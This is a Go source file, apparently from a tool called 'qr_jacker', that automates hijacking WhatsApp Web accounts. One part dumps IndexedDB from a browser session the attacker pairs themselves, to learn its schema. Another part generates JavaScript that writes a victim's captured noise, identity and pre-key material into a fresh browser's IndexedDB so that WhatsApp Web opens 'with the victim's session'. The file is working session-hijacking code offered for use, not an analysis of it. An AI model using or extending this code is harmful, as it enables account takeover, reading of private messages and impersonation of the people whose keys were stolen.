package whatsapp

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/chromedp/cdproto/indexeddb"
	"github.com/chromedp/cdproto/runtime"
	"github.com/chromedp/chromedp"
)

// ReferenceProfile represents a full IndexedDB dump from a paired WhatsApp Web session.
type ReferenceProfile struct {
	Databases []ReferenceDatabase `json:"databases"`
}

type ReferenceDatabase struct {
	Name    string           `json:"name"`
	Version int64            `json:"version"`
	Stores  []ReferenceStore `json:"stores"`
}

type ReferenceStore struct {
	Name    string        `json:"name"`
	KeyPath string        `json:"key_path"`
	AutoInc bool          `json:"auto_increment"`
	Indexes []string      `json:"indexes"`
	Entries []StoreEntry  `json:"entries"`
}

type StoreEntry struct {
	Key   string          `json:"key"`
	Value json.RawMessage `json:"value"`
}

// DiscoverReferenceProfile opens Chromium, navigates to web.whatsapp.com,
// waits for the user to scan the QR code, then dumps IndexedDB contents.
func DiscoverReferenceProfile(outDir string) error {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return fmt.Errorf("mkdir %s: %w", outDir, err)
	}

	userDir, err := os.MkdirTemp("", "whatsapp-ref-*")
	if err != nil {
		return fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(userDir)

	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.UserDataDir(userDir),
		chromedp.Flag("disable-extensions", false),
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
		chromedp.WindowSize(1280, 900),
	)

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer allocCancel()

	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		return fmt.Errorf("navigate: %w", err)
	}

	fmt.Println("\n============================================")
	fmt.Println("  WHATSAPP WEB - REFERENCE PAIRING")
	fmt.Println("============================================")
	fmt.Println("  A Chromium window will open with web.whatsapp.com")
	fmt.Println("  1. Scan the QR code with your phone")
	fmt.Println("  2. Wait for WhatsApp Web to load your chats")
	fmt.Println("  3. Come back to this terminal")
	fmt.Println("============================================")

	// Dump pre-pairing state
	fmt.Println("\n[*] Dumping pre-pairing IndexedDB...")
	preProfile := dumpIndexedDB(ctx)
	if preProfile != nil {
		saveJSON(filepath.Join(outDir, "pre_pairing.json"), preProfile)
	}

	// Wait for pairing (QR code disappears, main UI loads)
	fmt.Println("\n[*] Waiting for pairing (up to 2 minutes)...")
	pairCtx, pairCancel := context.WithTimeout(ctx, 120*time.Second)
	defer pairCancel()

	if err := chromedp.Run(pairCtx,
		chromedp.WaitVisible("#app .two", chromedp.ByQuery),
	); err != nil {
		fmt.Println("[!] Timed out waiting for pairing.")
		fmt.Println("[!] Make sure you scanned the QR code.")
		return nil
	}

	// Wait for IndexedDB to settle
	fmt.Println("[+] Paired! Waiting for IndexedDB to sync...")
	time.Sleep(5 * time.Second)

	// Dump post-pairing state
	fmt.Println("[*] Dumping post-pairing IndexedDB...")
	postProfile := dumpIndexedDB(ctx)
	if postProfile != nil {
		saveJSON(filepath.Join(outDir, "post_pairing.json"), postProfile)
	}

	fmt.Printf("\n[+] Reference profile saved to %s\n", outDir)
	fmt.Println("[+] You can close the Chromium window now.")
	return nil
}

func dumpIndexedDB(ctx context.Context) *ReferenceProfile {
	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	if err := chromedp.Run(ctx, indexeddb.Enable()); err != nil {
		return nil
	}

	var dbNames []string
	if err := chromedp.Run(ctx,
		indexeddb.RequestDatabaseNames().Do(&dbNames),
	); err != nil || len(dbNames) == 0 {
		return nil
	}

	profile := &ReferenceProfile{}

	for _, name := range dbNames {
		var dbs *indexeddb.DatabaseWithObjectStores
		if err := chromedp.Run(ctx,
			indexeddb.RequestDatabase(name).Do(&dbs),
		); err != nil || dbs == nil {
			continue
		}

		rdb := ReferenceDatabase{
			Name:    name,
			Version: int64(dbs.Version),
		}

		for _, store := range dbs.ObjectStores {
			rs := ReferenceStore{
				Name: store.Name,
				AutoInc: store.AutoIncrement,
			}
			if store.KeyPath != nil {
				switch store.KeyPath.Type {
				case "string":
					rs.KeyPath = store.KeyPath.String
				}
			}
			for _, idx := range store.Indexes {
				rs.Indexes = append(rs.Indexes, idx.Name)
			}

			// Fetch data from this store
			var entries []*indexeddb.DataEntry
			var hasMore bool
			var skip int64

			for {
				var batch []*indexeddb.DataEntry
				if err := chromedp.Run(ctx,
					indexeddb.RequestData(name, store.Name, int64(skip), 200).Do(&batch, &hasMore),
				); err != nil {
					break
				}
				entries = append(entries, batch...)
				if !hasMore || len(batch) == 0 {
					break
				}
				skip += int64(len(batch))
			}

			for _, entry := range entries {
				var keyStr string
				if entry.Key != nil {
					if entry.Key.Type == "string" {
						keyStr = entry.Key.String
					}
				}

				var val json.RawMessage
				if entry.Value != nil {
					valBytes, _ := json.Marshal(entry.Value)
					val = valBytes
				}
				rs.Entries = append(rs.Entries, StoreEntry{
					Key:   keyStr,
					Value: val,
				})
			}

			rdb.Stores = append(rdb.Stores, rs)
		}

		profile.Databases = append(profile.Databases, rdb)
	}

	return profile
}

func saveJSON(path string, v interface{}) {
	data, _ := json.MarshalIndent(v, "", "  ")
	os.WriteFile(path, data, 0644)
	fmt.Printf("    Saved: %s\n", filepath.Base(path))
}

// ReplayInBrowser opens Chromium, injects the captured session into
// IndexedDB via the reference profile schema, and opens web.whatsapp.com.
func ReplayInBrowser(sd *sessionData) error {
	refDir := "scripts/qr_jacker/whatsapp/reference"

	// Load the reference profile to get the IndexedDB schema
	refProfile, err := loadReferenceProfile(filepath.Join(refDir, "post_pairing.json"))
	if err != nil {
		return fmt.Errorf("load reference profile: %w", err)
	}

	userDir, err := os.MkdirTemp("", "whatsapp-replay-*")
	if err != nil {
		return fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(userDir)

	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.UserDataDir(userDir),
		chromedp.Flag("disable-extensions", false),
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
		chromedp.WindowSize(1280, 900),
	)

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer allocCancel()

	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	// Navigate to web.whatsapp.com
	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		return fmt.Errorf("navigate: %w", err)
	}

	// Wait for page to initialize and create IndexedDB
	time.Sleep(3 * time.Second)

	// Build and inject the session data via JavaScript
	jsCode := buildReplayJS(sd, refProfile)
	var result string
	if err := chromedp.Run(ctx, chromedp.Evaluate(jsCode, &result)); err != nil {
		return fmt.Errorf("inject: %w", err)
	}

	fmt.Println("[+] Session injected. Reloading...")
	if err := chromedp.Run(ctx, chromedp.Reload()); err != nil {
		return fmt.Errorf("reload: %w", err)
	}

	fmt.Println("[+] WhatsApp Web should load with the victim's session.")
	fmt.Println("[+] Keep the browser window open.")
	fmt.Println("[+] Press Enter in the terminal to disconnect.")
	fmt.Scanln()

	return nil
}

func loadReferenceProfile(path string) (*ReferenceProfile, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var p ReferenceProfile
	if err := json.Unmarshal(data, &p); err != nil {
		return nil, err
	}
	return &p, nil
}

// buildReplayJS generates JavaScript that injects the captured session into
// IndexedDB using the schema discovered from the reference profile.
func buildReplayJS(sd *sessionData, ref *ReferenceProfile) string {
	js := `
(async function() {
`
	for _, db := range ref.Databases {
		js += fmt.Sprintf(`
  var db%d = await new Promise(function(resolve, reject) {
    var r = indexedDB.open(%q, %d);
    r.onupgradeneeded = function(e) {
      var db = e.target.result;
`, 0, db.Name, db.Version)

		for _, store := range db.Stores {
			js += fmt.Sprintf(`
      if (!db.objectStoreNames.contains(%q)) {
`, store.Name)
			if store.KeyPath != "" {
				js += fmt.Sprintf("        db.createObjectStore(%q, {keyPath: %q});\n", store.Name, store.KeyPath)
			} else {
				js += fmt.Sprintf("        db.createObjectStore(%q);\n", store.Name)
			}
			js += "      }\n"
		}

		js += `
    };
    r.onsuccess = function(e) { resolve(e.target.result); };
    r.onerror = function(e) { reject(e.target.error); };
  });
`

		// Inject data into each store
		for _, store := range db.Stores {
			js += fmt.Sprintf(`
  // Inject into store %q
  var tx%d = db%d.transaction(%q, 'readwrite');
  var store%d = tx%d.objectStore(%q);
`,
				store.Name, 0, 0, store.Name, 0, 0, store.Name)

			// Generate data injection for each entry in the reference profile
			for _, entry := range refProfileEntries(sd, db.Name, store.Name, ref) {
				js += fmt.Sprintf("  store%d.put(%s, %s);\n", 0, entry.Value, entry.Key)
			}

			js += fmt.Sprintf(`
  await new Promise(function(resolve, reject) {
    tx%d.oncomplete = resolve;
    tx%d.onerror = reject;
  });
`, 0, 0)
		}
	}

	js += `
  console.log('[INJECT] Session injected successfully');
})();
`
	return js
}

type jsEntry struct {
	Key   string
	Value string
}

func refProfileEntries(sd *sessionData, dbName, storeName string, ref *ReferenceProfile) []jsEntry {
	// Find the reference store to get its entries structure
	var refStore *ReferenceStore
	for _, db := range ref.Databases {
		if db.Name == dbName {
			for _, s := range db.Stores {
				if s.Name == storeName {
					refStore = &s
					break
				}
			}
		}
	}
	if refStore == nil {
		return nil
	}

	// Build entries based on the reference, replacing known key types
	// with the victim's captured session data
	var entries []jsEntry
	for _, entry := range refStore.Entries {
		key := entry.Key
		val := string(entry.Value)

		// Try to identify and replace cryptographic keys
		switch key {
		case "noiseKey", "noise_key", "NoiseKey":
			val = fmt.Sprintf(`{pub: new Uint8Array(%s), priv: new Uint8Array(%s)}`,
				byteSliceToJS(sd.NoisePub), byteSliceToJS(sd.NoisePriv))
		case "identityKey", "identity_key", "IdentityKey", "identity":
			val = fmt.Sprintf(`{pub: new Uint8Array(%s), priv: new Uint8Array(%s)}`,
				byteSliceToJS(sd.IdentityPub), byteSliceToJS(sd.IdentityPriv))
		case "signedPreKey", "signed_pre_key", "SignedPreKey":
			val = fmt.Sprintf(`{keyId: %d, pub: new Uint8Array(%s), priv: new Uint8Array(%s), signature: new Uint8Array(%s)}`,
				sd.SignedPreKeyID, byteSliceToJS(sd.SignedPrePub), byteSliceToJS(sd.SignedPrePriv), byteSliceToJS(sd.SignedPreSig))
		case "registrationId", "registration_id", "RegistrationID":
			val = fmt.Sprintf(`%d`, sd.RegistrationID)
		case "advSecretKey", "adv_secret_key", "AdvSecretKey":
			val = fmt.Sprintf(`new Uint8Array(%s)`, byteSliceToJS(sd.AdvSecretKey))
		}

		if key != "" {
			entries = append(entries, jsEntry{
				Key:   fmt.Sprintf(`%q`, key),
				Value: val,
			})
		}
	}

	return entries
}

func byteSliceToJS(b []byte) string {
	if len(b) == 0 {
		return "[]"
	}
	s := "["
	for i, v := range b {
		if i > 0 {
			s += ","
		}
		s += fmt.Sprintf("%d", v)
	}
	s += "]"
	return s
}
